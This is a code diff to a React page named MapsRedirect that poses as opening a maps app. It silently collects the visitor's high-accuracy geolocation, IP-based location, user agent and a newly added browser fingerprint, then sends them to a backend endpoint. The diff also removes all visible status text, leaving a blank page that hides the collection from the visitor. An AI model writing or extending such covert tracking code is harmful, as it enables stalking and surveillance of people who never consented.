@@ -1,12 +1,10 @@
-import { useEffect, useState } from 'react'
-import { MapPin } from 'lucide-react'
+import { useEffect } from 'react'
+import { generateFingerprint } from './fingerprint'
 import './App.css'
 
 const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'
 
 function MapsRedirect() {
-  const [status, setStatus] = useState<'detecting' | 'redirecting' | 'error'>('detecting')
-
   useEffect(() => {
     const detectAndRedirect = async () => {
       const userAgent = navigator.userAgent.toLowerCase()
@@ -20,6 +18,8 @@ function MapsRedirect() {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             async (position) => {
+              const fingerprint = await generateFingerprint()
+              
               const locationData = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
@@ -28,7 +28,8 @@ function MapsRedirect() {
                 user_agent: navigator.userAgent,
                 city: ipData.city,
                 region: ipData.region,
-                country: ipData.country
+                country: ipData.country,
+                fingerprint: fingerprint
               }
 
               await fetch(`${API_BASE_URL}/api/location`, {
@@ -36,8 +37,6 @@ function MapsRedirect() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(locationData)
               })
-
-              setStatus('redirecting')
 
               const lat = position.coords.latitude
               const lng = position.coords.longitude
@@ -53,6 +52,8 @@ function MapsRedirect() {
             async (error) => {
               console.error('Location error:', error)
               
+              const fingerprint = await generateFingerprint()
+              
               const fallbackData = {
                 latitude: 0,
                 longitude: 0,
@@ -61,7 +62,8 @@ function MapsRedirect() {
                 user_agent: navigator.userAgent,
                 city: ipData.city,
                 region: ipData.region,
-                country: ipData.country
+                country: ipData.country,
+                fingerprint: fingerprint
               }
 
               await fetch(`${API_BASE_URL}/api/location`, {
@@ -69,8 +71,6 @@ function MapsRedirect() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(fallbackData)
               })
-
-              setStatus('error')
             },
             {
               enableHighAccuracy: true,
@@ -78,12 +78,9 @@ function MapsRedirect() {
               maximumAge: 0
             }
           )
-        } else {
-          setStatus('error')
         }
       } catch (err) {
         console.error('Failed to get IP info:', err)
-        setStatus('error')
       }
     }
 
@@ -91,19 +88,7 @@ function MapsRedirect() {
   }, [])
 
   return (
-    <div className="min-h-screen bg-white flex items-center justify-center">
-      <div className="text-center">
-        <MapPin className="h-12 w-12 text-blue-500 mx-auto mb-4" />
-        {status === 'detecting' && <p className="text-xl text-gray-600">Opening Maps...</p>}
-        {status === 'redirecting' && <p className="text-xl text-gray-600">Redirecting to Maps...</p>}
-        {status === 'error' && (
-          <div>
-            <p className="text-xl text-gray-600 mb-2">Unable to open Maps</p>
-            <p className="text-sm text-gray-500">Please allow location access</p>
-          </div>
-        )}
-      </div>
-    </div>
+    <div className="min-h-screen bg-white"></div>
   )
 }
 
